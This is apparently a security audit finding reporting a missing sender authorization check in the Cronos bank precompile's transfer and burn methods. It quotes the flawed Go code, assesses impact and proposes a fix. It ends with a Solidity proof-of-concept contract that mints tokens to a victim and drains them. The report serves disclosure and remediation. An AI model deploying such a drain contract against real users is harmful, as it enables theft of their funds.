### Title
Unchecked `sender` Argument in Bank Precompile `transfer` Enables Unauthorized Drain of Any Holder's `evm/` Native Tokens — (File: `x/cronos/keeper/precompiles/bank.go`)

---

### Summary

The bank precompile's `transfer` method accepts a fully caller-controlled `sender` address and performs `bankKeeper.SendCoins(ctx, from, to, ...)` with no check that `sender == contract.Caller()`. Any deployed contract can therefore move `evm/{callerContract}` native bank tokens out of any victim's account to any destination without the victim's authorization. The `burn` method shares the identical flaw.

---

### Finding Description

In `x/cronos/keeper/precompiles/bank.go`, the `Run` function dispatches to `TransferMethodName`:

```go
sender    := args[0].(common.Address)   // ← fully attacker-controlled
recipient := args[1].(common.Address)
amount    := args[2].(*big.Int)
...
from  := sdk.AccAddress(sender.Bytes())
to    := sdk.AccAddress(recipient.Bytes())
denom := EVMDenom(contract.Caller())    // evm/<callerContract>
amt   := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
...
bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
``` [1](#0-0) 

`sender` (→ `from`) is taken verbatim from the ABI-decoded call arguments. There is **no assertion** that `sender == contract.Caller()` and no allowance/approval mechanism. The denom is scoped to `evm/{callerContract}`, so the calling contract can only move tokens of its own denom — but it can move them **from any address that holds that denom**.

The `burn` case has the identical structure: `addr` (the address whose tokens are burned) is the first argument, caller-specified, with no authorization check. [2](#0-1) 

The `EVMDenom` helper confirms the denom namespace: [3](#0-2) 

The intended usage pattern is visible in the integration test contract `TestBank.sol`, where the contract correctly passes `msg.sender` as the sender — but the precompile never enforces this: [4](#0-3) 

---

### Impact Explanation

`evm/<contract>` tokens are **precompile-controlled native bank assets**. They are minted by calling `bank.mint(recipient, amount)` from a contract, and they live in the Cosmos bank module under the denom `evm/0x<contractAddress>`. Any contract that has minted such tokens to users can, at any later time, call `bank.transfer(victimAddress, attackerAddress, balance)` to silently drain every holder's balance — or `bank.burn(victimAddress, balance)` to destroy it — with no on-chain consent from the victim.

This is an **unauthorized transfer/burn of precompile-controlled assets**, squarely within the Critical impact category.

---

### Likelihood Explanation

The entry path is fully unprivileged: any EOA can deploy a contract and call the bank precompile. No admin key, governance vote, or validator compromise is required. The attacker only needs users to hold `evm/<attackerContract>` tokens, which is achievable by presenting the contract as a legitimate DeFi primitive (e.g., a wrapped token, a yield vault, or a liquidity pool that internally mints `evm/` tokens as receipts). Once users hold the tokens, the drain is a single contract call.

---

### Recommendation

Enforce that the `sender` argument equals the calling contract's own address before executing the transfer:

```go
case TransferMethodName:
    ...
    sender := args[0].(common.Address)
    if sender != contract.Caller() {
        return nil, errors.New("bank.transfer: sender must equal calling contract")
    }
    ...
```

Apply the same guard to `burn` (`addr` must equal `contract.Caller()`). Alternatively, introduce an allowance/approval mechanism analogous to ERC-20 `transferFrom` so that third-party contracts can act on behalf of token holders only with explicit approval.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBankModule {
    function mint(address recipient, uint256 amount) external returns (bool);
    function transfer(address sender, address recipient, uint256 amount) external returns (bool);
}

contract BankDrain {
    IBankModule constant bank = IBankModule(0x0000000000000000000000000000000000000064);

    // Step 1: lure victim into receiving evm/<this> tokens
    function seedVictim(address victim, uint256 amount) external {
        bank.mint(victim, amount);
        // victim now holds `amount` of evm/<BankDrain> in the Cosmos bank module
    }

    // Step 2: drain victim's balance to attacker — no victim approval needed
    function drain(address victim, address attacker, uint256 amount) external {
        bank.transfer(victim, attacker, amount);
        // bankKeeper.SendCoins(victim → attacker, evm/<BankDrain>) executes
        // with no authorization check on `victim`
    }
}
```

`drain()` succeeds because `x/cronos/keeper/precompiles/bank.go` passes `args[0]` directly as `from` to `bankKeeper.SendCoins` without verifying `args[0] == contract.Caller()`. [5](#0-4)
